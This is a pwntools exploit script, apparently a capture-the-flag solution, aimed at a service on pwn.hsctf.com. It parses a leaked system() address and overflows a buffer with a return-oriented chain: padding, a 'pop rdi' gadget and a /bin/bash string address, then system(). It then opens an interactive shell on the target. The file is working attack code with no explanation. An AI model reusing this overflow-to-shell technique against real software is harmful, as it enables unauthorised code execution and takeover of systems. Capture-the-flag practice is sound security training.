#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import re

########## LAUNCH SETTINGS ##########
host = args.HOST or 'pwn.hsctf.com'
port = int(args.PORT or 3131)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)
#######################################

########## FUNCTIONS / GADGETS ##########
POP_RDI = 0x401273 # pop rdi; ret
BINSH = 0x402051 # /bin/bash
#########################################

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

data = io.recv()
print data

SYSTEM = int(re.findall(r"computer: (.*)", data)[0], 16)

padding =  'a'*16
pl  = padding
pl += p64(POP_RDI) # pop rdi; ret
pl += p64(BINSH) # /bin/bash
pl += p64(SYSTEM) # system addr

io.recv()

io.sendline(pl)

io.interactive()
io.close()
